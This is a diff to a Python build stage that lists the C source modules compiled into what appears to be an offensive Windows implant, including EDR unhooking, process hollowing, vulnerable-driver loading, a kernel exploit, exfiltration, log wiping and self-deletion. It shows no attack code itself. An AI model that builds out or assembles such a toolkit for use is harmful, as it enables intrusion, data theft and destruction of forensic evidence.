@@ -87,30 +87,35 @@ class LinkStage(Stage):
         # Portable sources (always compiled)
         portable_sources = [
             runtime_dir / "init" / "anti_analysis.c",
-            runtime_dir / "cleanup" / "self_delete.c",
-            runtime_dir / "cleanup" / "logs.c",
+            runtime_dir / "compression"      / "compression.c",
         ]
 
         # Windows-only sources
         windows_sources = []
         if target_os == "windows":
             potential_sources = [
-                runtime_dir / "util"         / "mem.c",
-                runtime_dir / "windows"      / "windows_utils.c",
-                runtime_dir / "windows"      / "windows_api_impl.c",
-                runtime_dir / "windows"      / "registry" / "registry.c",
-                runtime_dir / "evasion"      / "unhook.c",
-                runtime_dir / "evasion"      / "syscalls.c",
-                runtime_dir / "evasion"      / "stack_spoof.c",
-                runtime_dir / "execution"    / "hollow.c",
-                runtime_dir / "execution"    / "byovd.c",
-                runtime_dir / "execution"    / "inmem.c",
-                runtime_dir / "execution"    / "driver_interact.c",
-                runtime_dir / "exploitation" / "kernel_exploit.c",
-                runtime_dir / "exfil"        / "exfil.c",
-                runtime_dir / "cleanup"      / "forensics.c",
-                runtime_dir / "forensics"    / "forensic_api_impl.c",
-                runtime_dir / "compression"  / "compression.c",
+                runtime_dir / "util"                    / "mem.c",
+                runtime_dir / "windows"                 / "windows_utils.c",
+                runtime_dir / "windows"                 / "windows_api_impl.c",
+                runtime_dir / "windows"                 / "registry" / "registry.c",
+                runtime_dir / "windows"                 / "evasion" / "unhook.c",
+                runtime_dir / "windows"                 / "evasion" / "syscalls.c",
+                runtime_dir / "windows"                 / "evasion" / "stack_spoof.c",
+                runtime_dir / "windows"                 / "execution" / "hollow.c",
+                runtime_dir / "windows"                 / "execution" / "byovd.c",
+                runtime_dir / "windows"                 / "execution" / "inmem.c",
+                runtime_dir / "windows"                 / "execution" / "driver_interact.c",
+                runtime_dir / "windows"                 / "exploitation" / "kernel_exploit.c",
+                runtime_dir / "exfil"                   / "exfil.c",
+                runtime_dir / "windows"                 / "anti_forensics" / "forensics.c",
+                runtime_dir / "windows"                 / "anti_forensics" / "self_delete.c",
+                runtime_dir / "windows"                 / "anti_forensics" / "logs.c",
+                runtime_dir / "forensics"               / "forensic_api_impl.c",
+                runtime_dir / "core"                    / "sandbox.c",
+                runtime_dir / "core"                    / "plugin.c",
+                runtime_dir / "crypto"                  / "crypto.c",
+                runtime_dir / "network"                 / "network.c",
+                runtime_dir / "obfuscation.c",
             ]
             windows_sources = [s for s in potential_sources if s.exists()]
 
